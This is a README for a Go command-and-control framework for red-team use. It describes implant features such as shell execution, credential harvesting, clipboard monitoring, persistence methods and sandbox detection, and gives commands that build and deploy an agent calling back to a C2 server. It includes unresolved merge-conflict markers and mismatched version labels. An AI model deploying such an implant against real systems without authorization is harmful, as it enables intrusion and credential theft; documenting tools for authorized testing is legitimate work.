# RhinoC2

## v1.2.1

A modular command and control framework built in Go for penetration testing and authorized red team operations. Features encrypted agent communications, session-based authentication, multi-session management, privilege detection, runtime configuration, and a clean web interface for operator control.

<<<<<<< HEAD
> **Detection Warning:** v1.2.0 is very detectable by modern endpoint protection. No obfuscation, evasion, or OPSEC features are implemented. This version is for educational purposes and controlled lab environments only. Production evasion capabilities are planned for v1.3+.
=======
> **⚠️ Detection Warning:** v1.2.1 is highly detectable by modern endpoint protection. No obfuscation, evasion, or OPSEC features are implemented. This version is for educational purposes and controlled lab environments only. Production evasion capabilities are planned for v1.3+.

> **🔒 Security Update (v1.2.1):** Added session-based authentication to protect all operator endpoints. Default credentials are admin/admin - **CHANGE IMMEDIATELY** in production environments.
>>>>>>> 53582bb (Update documentation for v1.2.1 authentication)

## What is this?

RhinoC2 is a command and control framework designed for authorized penetration testing. It's split into clean modules that handle different aspects of post-exploitation work.

The project includes:
- Modular package structure for easy maintenance
- Encrypted communications using AES-256-GCM
- WebSocket-based agent connections
- Web control panel for managing agents
- Multi-agent session management
- Privilege and integrity level detection
- Cross-platform agent builds
- Over 20 command types

## Getting Started

Build everything with the included script:
```powershell
.\build.ps1
```

Start the server:
```powershell
cd server
.\rhinoc2-server.exe
```

The server will listen on `http://localhost:8443`. Run an agent and open that URL in your browser to access the control panel.

Deploy an agent:
```powershell
cd agent
.\agent_windows_amd64.exe
```

## Structure

```
RhinoC2/
├── agent/              Implant code
├── server/             C2 server 
├── client/             Web control panel
├── pkg/                Reusable modules
│   ├── crypto/         Encryption handling
│   ├── commands/       Command execution, file ops, networking
│   ├── persistence/    Various persistence methods
│   ├── evasion/        Anti-VM and sandbox checks
│   └── postexploit/    Cred harvesting, screenshots, etc.
├── cmd/                Helper utilities
└── build.ps1           Build script
```

## Features

Commands are organized into categories for easier use.

### Basic Commands

- `shell` - Execute shell commands
- `sysinfo` - Gather system info
- `ps` - List running processes
- `pwd` / `cd` / `ls` - File navigation
- `download` / `upload` - File transfer
- `scan_port` - Port scanning
- `net_interfaces` - Network enumeration

### Agent Management

- **Multi-agent sessions** - Manage multiple compromised hosts simultaneously
- **Privilege detection** - Automatically identifies if agent is running as admin/SYSTEM
- **Integrity levels** - Shows process integrity (High, Medium, Low)
- **Process tracking** - Displays PID and parent PID for each agent
- **Real-time status** - Live updates of agent connectivity and last seen times

### Persistence Options

Multiple methods to maintain access:

- Registry run keys
- Startup folder
- Scheduled tasks
- Windows services

### Other Capabilities

- VM and sandbox detection
- Credential harvesting
- Screenshot capture
- Clipboard monitoring

### Building for Windows

Build for all Windows platforms:

```powershell
.\build.ps1 -Target all
```

Or build specific targets:

```powershell
.\build.ps1 -Target agent -OS windows -Arch amd64
.\build.ps1 -Target agent -OS windows -Arch 386
```

### Using the Builder Tool

**Build the builder first** (this makes subsequent builds much faster):

```powershell
go build -ldflags "-s -w" -o builder.exe cmd/builder/main.go
```

Now use the compiled builder (0.9 seconds vs 2+ minutes with `go run`):

```powershell
# Build server
.\builder.exe build server

# Build agent with default config (runtime configurable)
.\builder.exe build agent windows amd64

# Build agent with embedded config
.\builder.exe build agent windows amd64 --server ws://192.168.1.100:8443/api/agent --key YourKey --interval 10

# Build for Linux
.\builder.exe build agent linux amd64

# View all options
.\builder.exe help
```

**Performance tip:** Always use the compiled `builder.exe` instead of `go run cmd/builder/main.go` for 100x faster builds.

## Testing

Run the test suite to verify everything works:
```powershell
.\test-all-features.ps1
```

## Configuration

RhinoC2 v1.2.1 is fully configurable without editing source code. Configuration supports CLI flags, environment variables, and JSON config files.

### Authentication (v1.2.1+)

**Default Credentials:**
- Username: `admin`
- Password: `admin`

> **⚠️ CRITICAL:** Change default credentials immediately. These are only for initial setup and testing.

**Access the Login Page:**
```powershell
http://localhost:8443/login
```

After logging in, you'll be redirected to the control panel. Sessions expire after 24 hours of inactivity.

**Protected Endpoints:**
- `/api/operator` - WebSocket command interface
- `/api/agents` - Agent listing API
- `/api/build` - Payload builder
- `/panel.html` - Web control panel
- `/` - Main interface

**Unprotected Endpoints:**
- `/api/agent` - Agent check-in (protected by encryption key)
- `/login` - Login page
- `/api/login` - Login endpoint

### Quick Start

**Generate configuration files:**
```powershell
go run cmd/config/main.go
```

This creates configuration files in multiple formats (JSON, ENV, Go constants).

### Agent Configuration

**Method 1: Command-line flags**
```powershell
agent.exe -server ws://192.168.1.100:8443/api/agent -key YourSecretKey -interval 10
```

**Method 2: Environment variables**
```powershell
$env:RHINO_SERVER="ws://192.168.1.100:8443/api/agent"
$env:RHINO_KEY="YourSecretKey"
$env:RHINO_INTERVAL="10"
.\agent.exe
```

**Method 3: JSON config file**
```powershell
.\agent.exe -config agent_config.json
```

Example `agent_config.json`:
```json
{
  "server": "ws://192.168.1.100:8443/api/agent",
  "key": "YourSecretKey",
  "interval": 10
}
```

**Method 4: Build with embedded defaults**
```powershell
.\builder.exe build agent windows amd64 --server ws://192.168.1.100:8443/api/agent --key YourSecretKey --interval 10
```

### Server Configuration

**Method 1: Command-line flags**
```powershell
server.exe -port 9000 -host 0.0.0.0 -key YourSecretKey
```

**Method 2: Environment variables**
```powershell
$env:RHINO_PORT="9000"
$env:RHINO_HOST="0.0.0.0"
$env:RHINO_KEY="YourSecretKey"
.\server.exe
```

**Method 3: JSON config file**
```powershell
.\server.exe -config server_config.json
```

Example `server_config.json`:
```json
{
  "port": "9000",
  "host": "0.0.0.0",
  "key": "YourSecretKey"
}
```

### Configuration Priority

When multiple configuration methods are used, the following priority applies:
1. **CLI flags** (highest priority)
2. **Environment variables**
3. **Config file**
4. **Build-time embedded defaults**
5. **Hard-coded defaults** (lowest priority)

### Help

View all available options:
```powershell
.\agent.exe -help
.\server.exe -help
.\builder.exe help
```

## Important Notes

Change default encryption keys before deployment. Use TLS in production environments. This is for authorized testing only.

## Requirements

- Go 1.21 or newer
- gorilla/mux and gorilla/websocket packages
- golang.org/x/crypto for encryption

Dependencies are managed through go.mod and will be downloaded automatically during build.

## Extending

To add a new command:
1. Write the logic in the appropriate package under `pkg/`
2. Add a case in `agent/agent.go` handleTask function
3. Optionally add a button in the web panel

The modular structure makes it straightforward to add functionality without touching core components.

## Roadmap

### v1.2.0 (Current)
- ✓ **Full runtime configuration** - CLI flags, environment variables, JSON config files
- ✓ **Build-time configuration** - Embed defaults at compile time
- ✓ **Configuration generator** - Interactive tool for creating configs
- ✓ **Optimized builder** - 100x faster builds with compiled builder binary
- ✓ **Priority configuration system** - CLI > env vars > config file > embedded > defaults

## Legal

This is for authorized security testing and educational purposes. You're responsible for ensuring you have permission before using this on any systems. Unauthorized access to computer systems is illegal in most jurisdictions.


Use responsibly and legally.
